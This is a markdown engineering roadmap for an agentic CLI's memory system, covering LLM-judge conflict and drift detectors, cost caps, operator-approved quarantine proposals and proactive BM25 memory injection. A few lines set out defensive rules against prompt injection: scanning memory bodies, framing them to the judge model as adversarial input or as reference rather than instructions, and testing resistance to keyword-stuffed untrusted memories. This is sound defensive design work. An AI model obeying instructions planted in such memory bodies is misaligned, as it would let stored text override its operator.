| **T11.10** | `last_semantic_verify_at` dedup — `memory_verify_attempts(id, scope, name, content_hash, verdict, confidence, model_id, prompt_hash, attempted_at)` table. Scheduler skips re-dispatch when `(content_hash unchanged AND attempted_at > now - 7d AND verdict ∈ {passed, inconclusive})`. Cross-session memo so an opt-in operator doesn't pay LLM cost every boot for memories the subagent just judged unchanged. Contradicted verdicts always re-dispatch (high-stakes; want re-confirmation). |
| **T11.11** | Tests + acceptance — fixture: project memory `"we use JWT for auth"` in tmpdir whose code shows OAuth-only patterns. Heuristic returns `unknown` (no path claim) → semantic dispatched → subagent reads files → returns `contradicted` with `confidence: 0.85` → proposal lands in `pending` → operator approves → memory quarantined with paired `memory_events` + `eviction_events` rows. Additional pin: cost cap fires when synthetic budget of $0.01 is set + 11 dispatches attempted (11th refused). Additional pin: dedup table skips re-dispatch when content_hash unchanged + same-day attempt exists. |

**Acceptance:** with opt-in enabled, a semantic-only contradicted memory generates a pending proposal within one turn of being exposed. Operator approves via slash; memory transitions to `quarantined` with full audit trail (eviction_events + governance_proposal + subagent_runs all cross-linkable by ids). With opt-in disabled, no LLM call fires and no proposal lands (default-zero-cost preserved).

**What S11 does NOT do (deferred):**
- Consolidation (N similar memories → 1) — that's Slice 10 (not in scope here; subagent infrastructure of S11 is the building block but the consolidation prompt + flow is its own slice).
- Conflict detection between memories (pairwise) — Slice 13 below (V1 of S4 shipped audit substrate only; the LLM-judge conflict detector lands here).
- Drift detection across time (memory written 90 days ago, codebase migrated) — would need cross-session subagent that doesn't exist today. Future infrastructure.

## Slice 13 — LLM-judge `conflict_detected` detector · ✅ DONE

Replaces the heuristic textual matcher that S4 attempted and rolled back. The audit substrate (`/memory conflicts` slash + `listEvictionEventsByTrigger` repo helper) shipped in S4 V1; S13 wires the actual detection pipeline through S8's governance proposal substrate + S11's subagent infrastructure.

Why deferred to Phase 2 alongside S11:

- Heuristic textual conflict detection has unacceptable coverage on real-world prose (operator-authored memories rarely contain literal antonym + token-identical assertions). Empirical analysis during S4 V1 attempt showed <5% real-conflict coverage with non-zero false-positive surface on common English words.
- LLM-judge is the only path with realistic recall on paraphrase, semantic equivalence, and cross-clause contradictions.
- Direct auto-quarantine from a non-deterministic LLM verdict violates §1.1.4 (confidence ≠ authority). The propose-not-mutate path via S8 is the architecturally correct integration.

| Task | Description |
|---|---|
| **T13.1** | Subagent definition `verify-conflict.md` — analogous to S11's `verify-semantic.md`. System prompt frames input as adversarial pair (two operator-edited memory bodies); requires structured JSON output `{ conflicting: bool, conflict_kind: string, confidence: 0.0-1.0, evidence: { shared_concept: string, polarity_a: string, polarity_b: string } }`. Tool whitelist: `memory_read` only (the subagent already has both bodies in input). |
| **T13.2** | Pair-selection scheduler — at step boundary, polls `memory_events` for `action='created' | 'updated'` rows. For each unique (session, scope, name), pairs the written memory against active/quarantined siblings in the same scope (intra-scope only; T4.6 carries forward). **BM25 prefilter (avoid O(N²) explosion):** before dispatching pairwise LLM calls, run the just-written memory's body as a BM25 query against the same-scope sibling corpus (reuse `src/retrieval/views/memory.ts:createMemoryView` with `loadBodies: true`). Take top-K siblings (K=5 default, exported constant `CONFLICT_PREFILTER_K`). LLM-judge fires ONLY on those K pairs. For N=200 siblings, this caps LLM dispatch at 5 instead of 199 (40× cost reduction in worst case). Rationale: BM25 surface-token overlap is necessary-but-not-sufficient for semantic conflict — if zero token overlap, semantic conflict is implausibly rare; if some overlap, LLM-judge is worth the call. K=5 is the cheap-confident bound; tunable via policy. |
| **T13.3** | Injection pre-check + scanForInjection on BOTH bodies before invocation. Pair-level invocation means TWO potentially adversarial bodies enter the judge's window simultaneously; the system prompt must explicitly frame BOTH as adversarial input. |
| **T13.4** | Per-pair cost cap + dedupe. Reuse S11's `MAX_DISPATCHES_PER_SESSION = 10` + `MAX_COST_USD = 0.50` budgeting. Dedupe via `memory_verify_attempts` extension OR new `memory_conflict_attempts` keyed by `(session, scope-a/name-a, scope-b/name-b, content_hash_a, content_hash_b)`. |
| **T13.5** | Resolver implementation (carrying forward from S4 V1 design): provenance tier (`user_explicit > inferred > imported`) → recency → scope specificity → body length tiebreak → deterministic tiebreak (a wins). Pure function, LLM-agnostic. |
| **T13.6** | Emit governance proposal via S8 — kind=quarantine, source_memory_keys=[winner, loser], evidence=`{ winner_id, loser_id, conflict_kind, confidence, shared_concept, polarity_a, polarity_b, subagent_run_id, prompt_hash }`. Confidence below threshold (`SEMANTIC_CONFLICT_MIN_CONFIDENCE = 0.7`) auto-archives as rejected. Above threshold lands pending for operator review. |
| **T13.7** | Operator opt-in surface — `--memory-conflict-llm` flag OR policy `[memory.conflict].llm = true`. Default off. Surfaced via `/memory governance status`. |
| **T13.8** | Tests — fixture: pair of memories with semantic-only contradiction (e.g., `"use JWT for auth"` + `"the auth flow uses OAuth"`). Subagent verdict `conflicting: true, confidence: 0.85` → proposal lands pending → operator approves → loser quarantines with paired audit. False-positive avoidance pin: pair without semantic conflict → `conflicting: false` → no proposal. |

**Acceptance:** with opt-in enabled, writing a memory that semantically contradicts an existing same-scope sibling generates a pending governance proposal within one turn. Operator approves → loser transitions to `quarantined` with full audit (eviction_events + governance_proposal + subagent_runs cross-linkable). With opt-in disabled, no LLM call fires.

---

## Out of scope (deliberate)

- **`distribution_shift` / `source_removed` detectors** — listed in EVICTION §5.1 but tied to startup probes for external sources. Tracked separately as "reference dereference probe".
- **Compaction × quarantine cross-lifecycle** (EVICTION §9.7) — context-tuning subsystem's responsibility, not memory's.
- **`roi_below_threshold` detector** — depends on loop frio aggregation (FEEDBACK_ADAPTATION §3.2); listed in `docs/MEMORY.md §14.3`.

## Deferred — actionable but parked

### Extract `createDetectorScheduler<TCandidate>` abstraction

**Status:** the three LLM-judge governance detector schedulers (`src/memory/verify-semantic-scheduler.ts` 505 LOC, `verify-conflict-scheduler.ts` 540 LOC, `verify-override-scheduler.ts` 421 LOC = ~1466 LOC total) are ~80% structurally identical: cursor tuple `(createdAt, id)` + `advanceTo` helper, cap-check with worst-case headroom (`costUsdSpent + worst > maxCost`), exposures fetch + dedup loop, type/trust/state filter, pending-proposal short-circuit, dispatcher invocation, post-shutdown bail (G6), counters + `capExhausted` field, `sharedScopeOffline` derivation, forward-flag boilerplate (`...(deps.signal !== undefined ? { signal: deps.signal } : {})` × 8). What actually differs per detector: source query (`listSessionExposuresSince` vs `listMemoryEventsSince` vs `listOverrideEventsSince`), candidate shape (single memory / pair / memory + events), dispatcher function.

**Problem:** every cross-cutting fix touches all three files — the post-Phase-2 review round 2 (2026-05-18) had several commits that each had to land identical edits 3×: plan-mode gate (`fa9d80a`), `governanceDrift` mirror, registry sessionId. Easy-to-miss-one-site drift risk that already burned operator-facing surface (S3's `auditSessionId` omission survived two rounds of review before landing as commit `5daed95`). Adding a fourth detector (e.g., the deferred `edit_reverted` signal collector for S3.2) means another 400+ LOC of mostly-copy-paste.

**Fix shape:** extract a generic `createDetectorScheduler<TCandidate, TOutcome>({ pollSource, candidateBuilder, eligibilityFilter, dispatcher, ... })` factory in `src/memory/detector-scheduler.ts`. Each detector becomes ~80 LOC of adapter wiring (source query + candidate shape + dispatcher reference). Shared core handles cursor, cap, dedup, filter, dispatch wrap, shutdown, counters. Estimated reduction: 1466 → ~600 LOC (~60% cut). Cross-cutting fix surface drops from 3 sites to 1.

Companion: extract `isFactualMemoryEligible(file): boolean` to share the type/trust/state filter between the scheduler's pre-flight gate AND the dispatcher's TOCTOU re-peek. Today the two implementations can drift (and a new state filter added to one would silently skip the other).

Companion: extract `pickDefined(obj, keys)` (or use `lodash.pickBy(obj, isDefined)`) to replace the 30+ `...(deps.X !== undefined ? { X: deps.X } : {})` lines per scheduler with a single `pickDefined(deps, FORWARD_KEYS)`.

**Pull-in signal:** (a) a fourth detector lands (signal `edit_reverted` for S3, or any new governance LLM-judge), OR (b) a fifth round-of-fixes hits the "had to edit all three schedulers" pattern. Either is a real signal the abstraction is overdue.

**Risk:** harder to grep "everything about verify-semantic" in one file. Mitigated by keeping each adapter file focused on detector-specific shape + a single import from the shared core. The shared core's documentation needs to be load-bearing — operators tracking detector behavior shouldn't have to jump between two files for the common path.

**Spec reference:** none — pure internal refactor, no contract change. The detector outputs + audit chain shape stay identical.

### Persist scheduler cursor across process restarts

**Status:** each scheduler keeps its `(createdAt, id)` cursor in a closure variable. Initial value `(0, 0)` means the first poll after every process restart re-scans the entire source table from epoch. The attempts dedup cache (`memory_verify_attempts` etc.) prevents re-dispatch, so correctness is fine; only perf is at stake.

**Problem:** with 90d retention + heavy use, the source tables (`memory_provenance`, `memory_events`, `memory_override_events`) grow to thousands of rows. Every boot pays O(N) scan + N peek + N pending-proposal lookups before the cursor advances past the historical bulk. Latency at boot, not at steady state.

**Fix shape:** add a tiny `poll_cursors` kv table (PK: `(detector_name, parent_session_id)`, columns: `cursor_at INTEGER`, `cursor_id TEXT`, `updated_at INTEGER`). Persist on `advanceTo`; load on scheduler construction. Or land per-session in `sessions` table as a JSON blob. Either way the boot path skips historical noise.

**Pull-in signal:** boot-time scheduler scan starts showing up in performance traces (today probably <50ms, hard to notice).

**Spec reference:** none — internal optimization.

### Sync `task` subagent under cap-watchdog

**Status:** the cap watchdog in `runAgent` (`src/harness/loop.ts`) listens to `cost_update` IPC events per active subagent and fires `subagentHandleStore.cancelAll('cap_watchdog')` when cumulative live spend crosses `budget.maxCostUsd`. The store walks its `records` map.

**Problem:** sync `task` / `task_sync` spawns flow through `spawnSubagentImpl` WITHOUT a `handleId`, so no record is created in the store. A long-running sync subagent that overshoots its declared estimate mid-execution does NOT get cancelled by the watchdog; it runs to completion, charging `cumulativeChildCostUsd` after the fact. The hard cap may be exceeded by up to one sync child's actual cost.

**Fix shape:** either (a) plumb sync spawns through the store with an implicit `cap=1` slot so the watchdog reaches them, OR (b) attach a passive cost-update observer to sync runs that drives the same `cancelAll` logic. Both require deciding how sync's awaiting parent handles a watchdog-driven cancel (the parent is blocked on `await runSubagent`; cancellation needs to flow back through the abort signal already wired).

**Pull-in signal:** an operator reports a sync subagent overshooting `budget.maxCostUsd` by a non-trivial margin. Today's worst case is bounded by `definition.budget.maxCostUsd` (which the load gate already validates is finite + positive); ergonomic operators see the overage in their session totals but not at runtime.

**Spec reference:** `ORCHESTRATION.md §3.5` (in-flight cap enforcement) — currently silent on sync vs. async asymmetry; spec amendment should land alongside the fix.

## Dependency graph

```
Phase 1 — substrate + audit family (NO text heuristics — policy decision)
  S0 (escape hatch)              →  ✅ done
  S1 (provenance)                →  ✅ done, blocks S3/S11/S13
  S2 (verify_failed substrate)   →  🔁 rolled back; audit-only via /memory audit --trigger
  S6 (penalty)                   →  ✅ done
  S4 (conflict audit substrate)  →  ✅ done (substrate only)
  S5 (trust_revoked)             →  hash check + operator modal (no heuristic — deterministic)
  S3 (override counter)          →  threshold counter + LLM-judge proposal (deterministic gate, LLM verdict)
  S7 (docs+smoke)                →  last (after S0..S6)

Phase 2 — LLM-judge governance (`feat/memory-governance-llm`)
  S8  (proposal substrate)        →  ✅ done, unblocks S3/S11/S13
  S11 (LLM-judge verify_failed)   →  ✅ done, PRIMARY detector for factual drift
  S13 (LLM-judge conflict)        →  depends on S8 + S4 audit substrate (uses S11 subagent infra)
  S10 (consolidation subagent)    →  depends on S8, deferred
  S12 (confidence separation)     →  independent, deferred
```

Recommended order: **S0 ✅ → S1 ✅ → S2 🔁 → S6 ✅ → S4 ✅ → S5 ✅ → S7 ✅ → S8 ✅ → S11 ✅ → S3 / S13** (Phase 2 remainder; can ship in any order on top of S8 + S11's subagent infra).

Architectural commitment: zero text-heuristic for memory lifecycle decisions in this codebase. All prose judgment defers to LLM-judge via S8 governance proposals (propose-not-mutate; operator approves). Deterministic substrate (state machine, audit, frontmatter, hashing, expiry, scope precedence) stays.

Phase 2 ideally lands on a separate branch (`feat/memory-governance-llm`) since the LLM-judge family introduces a different risk surface (injection, cost, non-determinism) and merging Phase 1 first keeps the heuristic baseline shippable independently.

## Tracking

Each task lands as one or more commits on the active branch. Each slice closes with a `feat(memory): slice N done` entry in `docs/BACKLOG.md` summarizing the slice's commits. Phase 1 final consolidation at S7; Phase 2 begins on a new branch after that lands.

---

# Phase 3 — Proactive memory injection (§4.4) · ✅ COMPLETE · default ON (`feat/proactive-memory`)

**Branch: `feat/proactive-memory`** — the §4.4 spec is committed on this branch and the code follows on the same branch (spec precedes code in commit order, satisfying spec-first). Slice P0 is done; P1–P6 remain. Goal: an opt-in mode where the runtime identifies the turn's context, retrieves relevant memories by BM25, and injects their bodies into the turn — without the model calling `retrieve_context`. It is the materialization of the runtime triggers §4.3 left open. Default OFF; aimed at local/weak models where model-driven retrieval is unreliable (a strong model that already uses `retrieve_context` well only pays the added cache cost).

**Architecture decision — the injection seam.** Inject via the `injectWorkingStateBlock` pattern (`src/harness/working-state-inject.ts`, called at `loop.ts:2994`): an ephemeral block appended to `reqMessages` per turn. NOT the `UserPromptSubmit` hook's `additionalContext` — the loop collects it but never injects it into context (`loop.ts:2545` only reads `blockedBy`; only the tool path in `invoke-tool.ts` consumes `additionalContext`). The reqMessages-tail seam gives I1 (tail sits after the last cache breakpoint → prefix intact) and I2 (reqMessages rebuilt per turn → ephemeral) for free, off an already-tested path.

**Invariants carried from spec §4.4 (these ARE the acceptance gates):**

- **I1 — prefix intact.** Injection never re-renders the system-prompt index segment (§4.1); the body lands in the reqMessages tail, after the last cache breakpoint. Cost is the turn's new tokens only.
- **I2 — ephemeral.** The block lives for the turn that produced it; never persisted to `messages`, recomputed each turn.
- **I3 — trust preserved.** Only `trusted` + `active`. `untrusted` is NEVER injected proactively (§7.2 rule 2). **This requires the trust filter parked in "Memory trust filter on `retrieve_context` slot" (DEFERRED below)** — §4.4 I3 resolves that item's open design decision: hard-filter (mirror eager-load), not marker/opt-in, for the proactive path.
- **I4 — explicit floor + cap.** BM25 score floor + small top-K (~2–3). The floor is contract, not tuning.
- **I5 — auditable.** Every proactive recall emits a `retrieval_trace` row (surface `proactive`) + a `memory_provenance` exposure.

## Slice P0 — Foundation: flag + trust filter · ✅ DONE

| Task | Description |
|---|---|
| **TP0.1** | Add `memoryProactiveInject?: boolean` + `memoryProactiveInjectSource?: 'cli' \| 'project-config' \| 'user-config' \| 'default'` to `HarnessConfig` (mirror `memorySemanticVerify`, `harness/types.ts:1042`). Resolve precedence in `bootstrap.ts`. Default OFF. Config key `[memory] proactive_inject`. |
| **TP0.2** | Trust filter on the memory view — closes the parked "trust filter on `retrieve_context` slot" item (`retrieval/views/memory.ts:114-118`). Add `trustedOnly?: boolean` to `MemoryViewDeps`; when set, hard-filter `trust: untrusted` before BM25 indexing. This is the §4.4 I3 contract. |
| **TP0.3** | Tests: flag precedence (cli > project > user > default); untrusted never surfaces with `trustedOnly` (I3 at the view layer). `tests/retrieval/memory-view.test.ts` + a bootstrap flag test. |

**Done:** flag wired through `HarnessConfig` + `BootstrapInput` + `config/loaders.ts` (`[memory] proactive_inject` / `proactiveInject`, snake>camel, **default OFF**) and resolved in `bootstrap.ts` with cli>project>user>default precedence + a `memoryProactiveInjectSource` field. `trustedOnly` filter on `retrieval/views/memory.ts` enforcing the §4.4 I3 trusted+active contract — drops `trust: untrusted` (fail-closed; the `.map` corpus build became a `for` loop, one peek serves trust-check + bodies) AND narrows states to `active`-only (excludes quarantined; active-only landed in the P1 review). Default `retrieve_context` behavior unchanged — the broader untrusted-slot gap stays parked. Tests cover config precedence + the view trust/active filters; retrieval + bootstrap/governance/init suites green, typecheck + lint clean.

## Slice P1 — Proactive recall producer (pure) · `src/memory/proactive-recall.ts` (new) · ✅ DONE

| Task | Description |
|---|---|
| **TP1.1** | `buildProactiveRecall({ retrieve, threshold, topK })`: given `(goalText, prompt)`, build the query, call `ctx.retrieveContext(query, { views: ['memory'], loadBodies: true })` (`RetrieveFn`, `retrieval/types.ts:337`), filter `score ≥ floor`, take top-K, return `RecalledMemory[]`. |
| **TP1.2** | Query builder = `workingStateStore.get(sid).focus?.text ?? goalText` + the latest prompt (reuse the `session-context.ts:348` pattern). |
| **TP1.3** | Constants `PROACTIVE_RECALL_MIN_SCORE` + `PROACTIVE_RECALL_TOP_K` (exported, tunable). |
| **TP1.4** | Tests (I4): floor cuts; top-K respected; empty query → empty; trusted-only honored. Pure given the runner → deterministic fixtures. |

**Done:** `buildProactiveRecall(deps)` builds the query (goal + prompt; blank → recall nothing), scans the view's score order, applies the BM25 floor (`break` — sorted-desc) then the top-K cap (checked first, so `topK <= 0` recalls nothing), and resolves bodies via an injected `loadBody` (null/empty → dropped). Constants `PROACTIVE_RECALL_MIN_SCORE` (1.0, raw-BM25 scale) + `PROACTIVE_RECALL_TOP_K` (3), exported/tunable; P5 calibrates. **Design change from the plan:** deps are injected (`search` + `loadBody`), NOT `ctx.retrieveContext` — the runner takes no per-call `trustedOnly` (`RetrieveFnOpts` is `{toolCallId}` only; the memory view is built at boot), and routing through it would either flip the model-driven `retrieve_context` (the parked untrusted-slot gap) or drag in the pipeline's compression/levels. So P2 builds the `trustedOnly` + `loadBodies` view and passes its `search`; I3 stays in the view (P0), the trace (I5) in P4. **Review (medium):** extended `trustedOnly` to the full I3 contract (trusted + **active**), which removed the need for an in-producer re-rank (active-only ⇒ no quarantine-penalty reshuffle ⇒ the view's order is already final) and dropped the duplicated `===` comparator the finders flagged; also fixed a `topK <= 0` off-by-one. 8 producer tests + a quarantine-exclusion view test; retrieval suite green.

## Slice P2 — Injection point (I1/I2) · `src/harness/proactive-memory-inject.ts` (new, mirrors `working-state-inject.ts`) · ✅ DONE

| Task | Description |
|---|---|
| **TP2.1** | `injectProactiveMemoryBlock(reqMessages, recalled, step)` at the `loop.ts:2994` injection site. Marked block (`# Recalled for this turn`), ephemeral, never written to `messages`. |
| **TP2.2** | Wire into the loop behind `config.memoryProactiveInject` + the P3 gate. Build the recall (P1) just before the provider call. |
| **TP2.3** | Tests: I1 — system-prompt `memory` segment byte-identical with/without injection, breakpoint count unchanged; I2 — block present in `reqMessages`, absent from persisted `messages`; OFF when the flag is disabled. |

**Done:** the feature turns on (behind the flag, default OFF + primary-agent-only). `proactive-memory-inject.ts` (new): `injectProactiveMemoryBlock` appends the `# Recalled for this turn` block to the bottom of [current_turn] via the shared `appendTextToLastUserMessage` — I1 (never touches the system-prompt index segment → cached prefix intact) + I2 (replace-not-mutate on the `reqMessages` snapshot → nothing persisted); bodies framed as reference, not instructions. `createProactiveRecall` wires the §4.4 I3 view (trusted+active+loadBodies) + a `parseMemoryNodeId` body loader. Wired in `loop.ts` after `injectWorkingStateBlock`, gated on `memoryProactiveInject && enableStaticGuidance` (the primary-agent proxy) `&& memoryRegistry`. **The P3 focus-change gate folded in here** as `resolveCachedRecall`: recompute only when the working-state focus changes (a stable goal pays once), re-inject the cached block each step. 12 tests (renderer I1/I2; the gate's recompute/reuse/per-session; end-to-end wiring with the I3 trust+active filter); loop suite green, typecheck + lint clean.

## Slice P3 — Runtime-trigger gating · ✅ DONE (prompt-mention) · tool-call event deferred

The focus-change gate (TP3.1) shipped inside P2 (`resolveCachedRecall`). **Scope finding:** `runAgent` runs per-turn (each REPL prompt = a fresh run + fresh cache), so the recall already recomputes per prompt and BM25 already matches what the prompt says — a runtime-trigger *gate* is redundant with that. The non-redundant piece is surfacing `triggers:`-tagged memories the prompt mentions but the body doesn't carry — done below by folding the tags into the proactive corpus. The tool-call event trigger (the bigger win) is deferred (see below).

| Task | Description |
|---|---|
| **TP3.1** | ✅ Done in P2 — focus-change gate (`resolveCachedRecall`): recompute only when the working-state focus changes. |
| **TP3.2** | Runtime-trigger matcher: match the prompt/event against `triggers:` runtime tags (the §4.3 runtime layer the boot-only `triggers.ts` left open). Compose with the focus gate (recall when EITHER fires). |
| **TP3.3** | Tests: a trigger-tagged prompt recalls on a stable focus; no trigger + stable focus → no recall. |

**Done (prompt-mention):** the memory view folds each memory's `triggers:` tags into the BM25 corpus (`TRIGGER_WEIGHT = 2`) ONLY on the proactive `trustedOnly` path, so a memory tagged `triggers: [deploy]` surfaces for a prompt mentioning "deploy" even when name/desc/body never say it — the §4.3 prompt-mention runtime trigger, no loop/gate change, zero effect on model-driven `retrieve_context` (tags aren't indexed there). The test pins both sides (proactive matches the tag-only term; model-driven doesn't).

**Deferred — tool-call event trigger:** the genuinely distinct signal — model calls `bash` ⇒ surface `triggers: [bash]` memories the prompt never named — needs the loop to track tools-called-this-turn and feed them into the recall query/key. Higher value than prompt-mention but a loop-touching slice; parked as the §4.3 runtime "tool fired" layer.

## Slice P4 — Trace + provenance (I5) · ✅ DONE

| Task | Description |
|---|---|
| **TP4.1** | The runner already writes `retrieval_trace`; tag the proactive call `surface='proactive'`. |
| **TP4.2** | Emit a `memory_provenance` exposure per injected memory (reuse the `eagerExposures` emitter). |
| **TP4.3** | Tests (I5): each injection → provenance row with `surface='proactive'`; visible via `/memory provenance`. |

**Done:** I5 is **provenance-only** for the proactive path — it bypasses the `retrieve_context` pipeline (no `retrieval_query_id`), so it's shaped like `eager`, not `retrieve_context`; there's no `retrieval_trace` to tag (TP4.1 assumed the runner — the runner isn't on this path). Migration 080 widens the `memory_provenance.surface` CHECK with `'proactive'` (rebuild, like 069; FKs + indexes preserved); `ProvenanceSurface` + `recordProvenance` treat it like `eager` (toolCallId null, no retrieval grouping fields). `recordProactiveExposures` (in `proactive-memory-inject.ts`) emits one exposure per injected memory, called from the loop on RECOMPUTE only (one row per memory per focus, not per step), best-effort inside the same try; `resolveCachedRecall` now returns `{recalled, recomputed}` to drive it. `/memory provenance` renders it unchanged (the renderer is surface-generic). Tests: repo (proactive inserts; rejects non-null toolCallId / retrieval fields), the emitter (a row per memory, malformed ids skipped), migration applies; slash + provenance suites green.

## Slice P5 — Eval (default gate) · ✅ DONE · calibration cleared → default ON

`evals/memory/proactive/`. Measures, on target (local/weak) models: useful recall vs injected noise; Δcache cost vs the reactive baseline (§4.1–4.2); I3 robustness under keyword-stuffing. **No default-ON without a green eval** — the flag stays OFF until the numbers justify it.

**Done:** `evals/memory/proactive/` — 6 deterministic fixtures (no model) + `tests/memory/proactive-eval-fixtures.test.ts`, mirroring the `evals/memory/` governance-eval shape. Covers the axes above: useful recall vs noise (01); Δcache cost = 0 on off-topic turns + bounded (≤600 chars, ~100 tokens) at top-K (02/05); I3 robustness — untrusted (03) + quarantined (04) memories keyword-stuffed to the top of BM25 still never surface (the trust/active gate precedes scoring); top-K cap (05); P3 prompt-mention trigger (06). Runs against the REAL production defaults (floor 1.0, top-K 3).

**Finding (feeds calibration):** the BM25 floor is absolute but IDF is corpus-relative — a term shared across a tiny corpus scores below 1.0 even when obviously relevant (the 06 trigger match scored 0.96 in a 2-doc corpus). The floor right for a large store is too high for a small one. **This pins the mechanism, not the values** — useful-recall-rate vs noise-rate tuning against a target (local/weak) model is the deferred default-ON calibration; the flag stays OFF until then.

## Slice P6 (optional) — Operator surface

`/memory` shows what was proactively injected this turn/session; toggle like `/memory governance`.

## Dependency graph

```
P0 (flag + trust filter)   →  unblocks P1 (I3) and P2
P1 (recall producer)       →  feeds P2
P3 (gating)                →  feeds P2
P2 (injection, I1/I2)      →  P4 (trace, I5)  →  P5 (eval gate)
P6 (operator surface)      →  optional, after P2
```

Recommended order: **P0 → P1 + P3 (parallel) → P2 → P4 → P5**. P6 optional.

**Reuses:** BM25 memory view, `ctx.retrieveContext` runner, `retrieval_trace` + `memory_provenance`, the detector feature-flag pattern, and `injectWorkingStateBlock`. No vector (principle 9). New code is small: `proactive-recall.ts` + `proactive-memory-inject.ts` + the trust-filter option + the flag + the gate.

**Pull-in signal:** the §4.4 spec PR merges AND a target use-case lands — a local-model session where the operator reports memory not being recalled because the model never calls `retrieve_context`.

---

# DEFERRED — items intentionally left for later

## Shimmer on verb chips — §13 alignment (or removal)

**Status:** shipped EXPERIMENTAL — a sliding highlight on the awaiting / assistant / thinking / critique verbs (`render/shimmer.ts`). The module + chip comments mark it experimental; the spec is not amended.

**Decision pending:** it collides with `UI.md §13` ("Animações. Só spinner. Nada de fade, slide, transition."). If the shimmer stays, `§13` gets a deliberate revision — "só spinner" → "spinner + the verb-chip shimmer", keeping the veto on slide / layout transition; and the EXPERIMENTAL markers come out. If it goes, revert the shimmer.

**Pull-in signal:** operator confirms the shimmer stays (or asks to drop it).

## Markdown code-fence syntax highlighting

**Status:** deferred. Markdown rendering shipped — slice A (static GFM render) + slice C (table grid / stack degradation), spec aligned (`UI.md §4.11`, `§6`, `AGENTIC_CLI §3`, `CONTEXT_TUNING §1.5`); slice B (streaming) was dropped. Full history in `docs/BACKLOG.md`. This is the one piece left open.

**What it is:** code fences in the assistant's prose render `dim`, with no syntax highlighting. Real highlighting needs more colors than the `§6.1` palette allows (8 tokens, "sem 256-color, sem truecolor").

**Why deferred:** it is the markdown-render decision that most strains `§6` — either the palette opens (a `§6.1` amendment) or fences stay monochrome. No demand signal, and monochrome `dim` fences are perfectly readable.

**Pull-in signal:** operator asks for highlighted fences, or `§6.1` is revisited for another reason.

## LLM-judge detector caps: push notification when latched (MEMORY.md §12.5.5)

**Status:** noted during the post-Slice-Q architecture review (2026-05-18). Companion to TODO entry "Aggregate observability for memory-governance detectors" below — both close the loop on the default-ON detector posture.

**What it is:** the verify-semantic + verify-conflict schedulers hold per-session counters (`dispatched`, `costUsdSpent`) with caps (`MAX_DISPATCHES_PER_SESSION = 10`, `MAX_COST_USD = 0.5`). When either cap latches, the scheduler:

1. Sets `counters.capExhausted = 'dispatch' | 'cost'`.
2. Writes one stderr line.
3. Returns early on subsequent ticks for the rest of the session.

The stderr line scrolls off; the `capExhausted` state is only readable via `/memory governance status` (pull). An operator in a long session can lose visibility on the fact that the detector silently stopped running — exactly the kind of "default-ON that silently degrades" failure mode the Slice Q first-boot banner was designed to prevent.

**Why deferred:** ergonomics, not correctness. Cap-latch is rare in normal use ($0.50 / 10 dispatches is enough headroom for typical sessions); ship the visible-pull surface first and let real operator feedback drive the push surface.

**Where it would land:**

- `src/memory/verify-semantic-scheduler.ts` + `src/memory/verify-conflict-scheduler.ts` — when the cap first latches, emit a TUI bus event (e.g. `governance:cap_exhausted` payload `{detector: 'verify_semantic'|'verify_conflict', cap: 'dispatch'|'cost', counters}`) once per scheduler instance (latch-edge, not every tick).
- `src/cli/slash/commands/memory.ts` — bare `/memory` summary line surfaces a `(governance: 1 detector capped — see /memory governance status)` suffix when any scheduler is capped in the current session.
- Alternative surface: inline notification (existing `addInlineNote` / similar) on the first `/memory <anything>` after the latch — operators typing memory slash commands are the ones who'd act on the signal.

Decision when pulled: push (event-driven, visible immediately) vs lazy (next operator query). Edge case: a session that hits the cap and never types another `/memory ...` would still miss the lazy surface — push is safer for the default-ON posture.

**Pull-in signal:** any of: (a) operator-reported incident where a detector stopped running and the operator only noticed via `/memory governance status` later; (b) telemetry shows non-trivial fraction of sessions reach cap; (c) the post-Slice-Q "is the default ON actually producing useful proposals?" review (the companion observability entry below) makes cap visibility a prerequisite.

**Cost when pulled:** small (~50 lines + tests). The TUI bus already exists; the scheduler already tracks `capExhausted`. Mostly wiring.

## Aggregate observability for memory-governance detectors (MEMORY.md §12.5)

**Status:** noted during the post-Slice-Q architecture review (2026-05-18). Companion to the "caps push notification" entry above.

**What it is:** `/memory metrics` covers the eviction pipeline (motivo distribution, restore rate, quarantine dwell, block counts). No analog exists for the LLM-judge detectors. Questions like:

- "What's the detector's true-positive rate? How many `contradicted`/`conflicting` verdicts landed as proposals, and how many of those did operators approve?"
- "Which memories generate the most quarantine proposals?" (signals: noisy memory, ambient drift in the repo around a stable memory, detector false-positive bias)
- "What's the cumulative dollar cost per session window?" (mid-flight visibility into the `MAX_COST_USD` cap)
- "Which memories have never been exposed?" (the inverse of proposals — memories that aren't earning their slot in eager-load)

…require manual SQL joins across `memory_verify_attempts` + `memory_conflict_attempts` + `memory_governance_proposals` + `memory_events` + `memory_provenance`. Operator-side this is fragile. The pull-in is exactly when defaults flipped ON (Slice Q): "are these detectors helping or making noise?" stops being theoretical.

**Why deferred:** scoped out of Slice Q (Slice Q was about inverting the default + opt-out surface, not new observability). The substrate to compute these metrics already exists — only the rendering + slash surface is missing.

**Where it would land:**

- `src/cli/slash/commands/memory.ts` — new subcommand `/memory detector metrics [--days N]` aggregating:
  - **Per-detector** (S11 verify-semantic / S13 verify-conflict):
    - dispatches in window (total, by verdict — passed/contradicted/inconclusive for S11, compatible/conflicting for S13)
    - proposals emitted (verdicts that crossed `confidence >= threshold`)
    - sub-threshold auto-archived count (the silent drop path)
    - approval rate of emitted proposals (approved / (approved + rejected + expired); pending excluded)
    - cumulative cost / mean cost per dispatch
    - dedup-cache hit rate (cache hits / total attempts)
  - **Memory ranking**: top N memories by proposal count (cross-detector); top N memories with zero exposures over the window.
- `src/storage/repos/memory-governance.ts` (or sibling) — aggregator queries returning typed structs. Pure SELECT; no schema changes.
- `tests/cli/slash/memory.test.ts` + repo tests pinning the aggregates against seeded fixtures.

**Pull-in signal:** any of: (a) first operator who hits "is verify_semantic actually finding bugs?" and runs out of patience with raw SQL; (b) `MAX_COST_USD` cap latches in real use and the post-mortem needs "where did the money go?"; (c) tuning the confidence threshold needs sub-threshold-drop visibility to choose between 0.6 and 0.8.

**Cost when pulled:** medium. ~150-200 lines of SQL + rendering + tests. The harder design question is what the table shape should be — operator-facing aggregates need a clear narrative ("here's whether the detector is helping you"), not just "here are the numbers".

## Memory quarantine flag enrichment: motivo + date (MEMORY.md §6.5.2)

**Status:** noted during Slice 0 (T0.2) and Slice 6 (T6.2) implementation. Same deferral shape on two surfaces.

